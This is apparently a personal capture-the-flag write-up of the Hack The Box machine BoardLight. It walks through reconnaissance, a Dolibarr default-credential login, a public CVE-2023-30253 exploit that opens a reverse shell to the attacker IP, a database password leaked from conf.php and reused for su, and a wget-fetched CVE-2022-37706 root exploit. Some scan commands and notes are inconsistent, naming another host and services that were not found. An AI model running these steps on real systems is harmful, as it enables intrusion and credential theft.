## Intro

Tags: #linux #OSCPpath #DefaultCreds #LinPEAS #unknown-binary #easy 

------
# Reconnaissance

Add target to hosts
## Port scan
### Quick open TCP ports discovery

```bash
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n boardlight.htb
```

```bash
Nmap scan report for 10.10.11.11
Host is up (0.092s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.99 seconds
```

here the only service thats worth diving deeper seems port 80, the others are https, rdp, winrm

### Targeted nmap scan towards open TCP ports

```bash
sudo nmap -p80,443,3389,5985 -A giddy.htb
```

```shell
Nmap scan report for 10.10.11.11
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.28 seconds
```

## WebApp

## Banner grabbing

```shell
curl -I http://boardlight.htb/

HTTP/1.1 200 OK
Date: Wed, 02 Jul 2025 16:31:42 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

![](HTB_machines/MediaFiles/Pasted%20image%2020261002225951.png)
lets add `board.htb`  to hosts

## Virtual hosts

```shell
gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain 
```

```shell
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://board.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: crm.board.htb Status: 200 [Size: 6360]

```
found subdomain `crm.board.htb`

### Navigating the subdomain

Its version is `17.0.0`
![](HTB_machines/MediaFiles/Pasted%20image%2020261002230215.png)

## Admin login via default creds

found default creds `Admin:admin` on 
https://www.dolibarr.org/forum/t/login-after-installation/16088/5

![](HTB_machines/MediaFiles/Pasted%20image%2020261002230349.png)
once logged in we see multiple stuff like dashboards, user management and other app related settings

Navigating the git repo of Dolibarr, i saw it uses `php` on `Languages` section

-----
# Foothold

## Vulnerable web app

 looked up potential exploits for Dolibarr 17.0.0 and found this one: [https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)
```shell
python3 exploit.py http://crm.board.htb admin admin 10.10.14.247 4444
```
got rev shell back!
## Shell as www-data

### Filesystem enumeration

```shell
www-data@boardlight:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 May 17  2024 .
drwxr-xr-x 19 root    root    4096 May 17  2024 ..
drwxr-x--- 15 larissa larissa 4096 May 17  2024 larissa
www-data@boardlight:/home$ whoami
www-data
www-data@boardlight:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@boardlight:/home$ cd larissa/
bash: cd: larissa/: Permission denied
```
lets check `/etc/passwd` to see what users are available
```shell
www-data@boardlight:/tmp$ cat /etc/passwd | grep "larissa"
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```
lets go back and check the web app's dir
```shell
www-data@boardlight:/$ cd /var/www/html
www-data@boardlight:~/html$ ls
board.htb  crm.board.htb
www-data@boardlight:~/html/board.htb$ ls -al
total 72
drwxr-xr-x 5 www-data www-data  4096 May 17  2024 .
drwxr-xr-x 4 www-data www-data  4096 May 17  2024 ..
-rw-rw-r-- 1 larissa  larissa   9100 May 15  2024 about.php
-rw-rw-r-- 1 larissa  larissa   9426 May 15  2024 contact.php
drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 css
-rw-rw-r-- 1 larissa  larissa   9209 May 15  2024 do.php
drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 images
-rw-rw-r-- 1 larissa  larissa  15949 May 15  2024 index.php
drwxrwxr-x 2 larissa  larissa   4096 May 17  2024 js
www-data@boardlight:~/html/crm.board.htb/htdocs$ cd conf/
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
conf.php  conf.php.example  conf.php.old
```
inside `conf.php` i found creds!

#### creds obtained
```
dolibarrowner
serverfun2$2023!!
```

## Shell as larissa

by changing to user larissa with the above password we logged in successfully!
```shell
www-data@boardlight:~/html$ su - larissa
Password: 
larissa@boardlight:~$ whoami
larissa
```
grabbed user flag

-----
# Privesc

## Linpeas

![](HTB_machines/MediaFiles/Pasted%20image%2020261002235231.png)
or could find it manually by running this instead
```shell
find / -perm -4000 2>/dev/null
```
output
```shell
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
```
### Unknown SUID binary

found suid binaries that belong to `enlightenment` program 

### Binary vulnerable to CVE-2022–37706

which i later found that was vulnerable to `CVE-2022–37706`
```shell
wget 10.10.14.247:8000/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

## Shell as root

got shell as root and grabbed root flag
```shell
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
exploit.sh: 8: [[: not found
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)

# cat root.txt
```